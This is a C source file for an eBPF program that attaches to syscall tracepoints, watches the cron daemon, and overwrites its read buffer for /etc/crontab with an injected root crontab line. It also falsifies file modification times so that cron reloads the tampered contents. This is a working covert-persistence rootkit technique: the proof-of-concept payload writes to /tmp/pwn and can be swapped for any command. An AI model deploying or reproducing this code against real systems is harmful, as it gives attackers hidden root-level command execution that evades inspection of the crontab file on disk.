#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define TARGET_NAME "cron"
#define TASK_COMM_LEN 64
#define CRONTAB "/var/spool/cron"
#define SPOOL_DIR "crontabs"
#define SYS_CRONTAB "/etc/crontab"


int cron_pid = 0 ;
struct stat * statbuf_ptr=NULL;
struct stat * statbuf_fstat_ptr=NULL;
void* read_buf_ptr=NULL;
char filename_saved[100]={};
char openat_filename_saved[100]={};
int open_fd=0;
int crontab_read=0;

//char PAYLOAD[] = "* * * * * root /bin/bash -c 'date > /tmp/pwned' \n #";
char PAYLOAD[] = "* * * * * root /bin/bash -c 'date > /tmp/pwn' \n #\x00";

static __inline void *memcpy(void *dest, const void *src, size_t count)
{
        char *tmp = dest;
        const char *s = src;

        while (count--)
                *tmp++ = *s++;
        return dest;
}

static __inline  int memcmp(const void *cs, const void *ct, size_t count)
{
    const unsigned char *su1, *su2;
    int res = 0;
    for (su1 = cs, su2 = ct; 0 < count; ++su1, ++su2, count--)
        if ((res = *su1 - *su2) != 0)
            break;
    return res;
}

static __inline  void handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
    int pid=0;
    pid = bpf_get_current_pid_tgid() & 0xffffffff;

    if(pid!=cron_pid){
        return;
    }

    struct pt_regs *regs;
    char buf[60];
    char *pathname ;

    int fd=0;
    regs = (struct pt_regs *)(ctx->args[0]);
    fd = PT_REGS_PARM1_CORE(regs);

    read_buf_ptr = (void *)PT_REGS_PARM2_CORE(regs);
    if(fd != open_fd){
        return ;
    }

    crontab_read = 1;

    bpf_printk("[handle_enter_read] read fd is %d\n",fd);
    bpf_printk("[handle_enter_read] read_buf is : %p\n",read_buf_ptr);
    return;
}

static __inline  void handle_enter_close(struct bpf_raw_tracepoint_args *ctx){
    //bpf_printk("handle_enter_close\n");
}


static __inline  int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx){
    //bpf_printk("handle_enter_stat\n");
    struct pt_regs *regs;
    char *pathname;
    char buf[64];

    regs = (struct pt_regs *)ctx->args[0];
    pathname = (char *)PT_REGS_PARM1_CORE(regs);
    bpf_probe_read_str(buf, sizeof(buf), pathname);

    if (memcmp(buf, SYS_CRONTAB, sizeof(SYS_CRONTAB)) && memcmp(buf, SPOOL_DIR, sizeof(SPOOL_DIR)))
        return 0;

    bpf_printk("[handle_enter_stat] stat pathname is %s\n",pathname);

    if (cron_pid == 0)
    {
        cron_pid = bpf_get_current_pid_tgid() & 0xffffffff;
    }

    memcpy(filename_saved, buf, 64);

    statbuf_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);

    bpf_printk("[handle_enter_stat] statbuf_ptr saved is %p\n",statbuf_ptr);

    return 0;
}


static __inline  void handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx){
    struct pt_regs *regs;
    char buf[64];
    char *pathname ;
    int fd=0;

    regs = (struct pt_regs *)(ctx->args[0]);
    fd = PT_REGS_PARM1_CORE(regs);
    if(fd != open_fd){
        return;
    }

    statbuf_fstat_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);

    bpf_printk("[handle_enter_stat] statbuf_fstat_ptr saved is %p\n",statbuf_fstat_ptr);

}

static __inline  void handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){
    struct pt_regs *regs;
    char *pathname;
    char buf[64];

    int pid = bpf_get_current_pid_tgid() & 0xffffffff;

    if (pid != cron_pid)
        return ;

    regs = (struct pt_regs *)(ctx->args[0]);
    pathname = (char *)PT_REGS_PARM2_CORE(regs);

    bpf_probe_read_str(buf,sizeof(buf),pathname);

    if(memcmp(buf,SYS_CRONTAB,sizeof (SYS_CRONTAB))){
        return;
    }


    memcpy(openat_filename_saved, buf, 63);

    bpf_printk("[handle_enter_openat]openat_filename_saved: %s\n", openat_filename_saved);

}



static __inline  void handle_read(struct bpf_raw_tracepoint_args *ctx){
    if(!crontab_read){
        return;
    }
    crontab_read = 0;
    int pid = bpf_get_current_pid_tgid() & 0xffffffff;

    if(pid!=cron_pid){
        return;
    }
    if (read_buf_ptr == NULL){
        return;
    }

    ssize_t ret = ctx->args[1];

    if(ret < 0){
        read_buf_ptr = NULL;
        return;
    }

    bpf_printk("[handle_read]read ori info,count is %d\n",ret);

    if(ret < sizeof (PAYLOAD)){
        bpf_printk("[handle_read]payload too long\n");

        read_buf_ptr = NULL;
        return;

    }
    bpf_probe_write_user(read_buf_ptr, PAYLOAD, sizeof(PAYLOAD));

    bpf_printk("[handle_read]payload hacked finished, payload is %s\n",PAYLOAD);
    read_buf_ptr = NULL;
}

static __inline  int handle_stat(){

    if (statbuf_ptr == 0)
        return 0;
    bpf_printk("[handle_stat] statbuf_ptr saved is %p\n",statbuf_ptr);
    bpf_printk("[handle_stat]cron %d stat %s\n", cron_pid, filename_saved);

    // conditions:
    // 1. !TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))
    // 2. !TEQUAL(syscron_stat.st_mtim, ts_zero)

    __kernel_ulong_t spool_st_mtime = 0;
    __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;

    if (!memcmp(filename_saved, SPOOL_DIR, sizeof(SPOOL_DIR)))
    {
        bpf_probe_write_user(&statbuf_ptr->st_mtime, &spool_st_mtime, sizeof(spool_st_mtime));
    }

    if (!memcmp(filename_saved, SYS_CRONTAB, sizeof(SYS_CRONTAB)))
    {
        bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
    }

    bpf_printk("[handle_stat]cron stat  modify succcess\n");
    statbuf_ptr = NULL;
    return 0;
}

static __inline  void handle_fstat(){
    if(open_fd == 0){
        return;
    }
    if(statbuf_fstat_ptr == NULL){
        return;
    }

    __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;
    bpf_probe_write_user(&statbuf_fstat_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));

    bpf_printk("[handle_fstat]  statbuf_fstat_ptr modify success\n");

    statbuf_fstat_ptr = NULL;

}

static __inline  void handle_openat(struct bpf_raw_tracepoint_args *ctx){

    if (!memcmp(openat_filename_saved, SYS_CRONTAB, sizeof(SYS_CRONTAB)))
    {
        open_fd = ctx->args[1];
        bpf_printk("[handle_openat]open_fd saved: %s, %d\n", openat_filename_saved, open_fd);
        openat_filename_saved[0] = '\0';
    }
}


SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    // executable is not cron, return
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
        return 0;
    switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            handle_enter_stat(ctx);
            break;
        case 5:
            handle_enter_fstat(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            return 0;
    }
    return -1;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
    struct pt_regs *regs;
    if (cron_pid == 0)
        return 0;

    int pid = bpf_get_current_pid_tgid() & 0xffffffff;

    if (pid != cron_pid)
        return 0;

    unsigned long id;
    regs = (struct pt_regs *)(ctx->args[0]);
    id = BPF_CORE_READ(regs,orig_ax);

    switch (id)
    {
        case 0:
            handle_read(ctx);
            break;
        case 4:
            handle_stat();
            break;
        case 5:
            handle_fstat();
            break;
        case 257:
            handle_openat(ctx);
            break;
        default:
            return 0;
    }
    return 0;
}

char _license[] SEC("license") = "GPL";
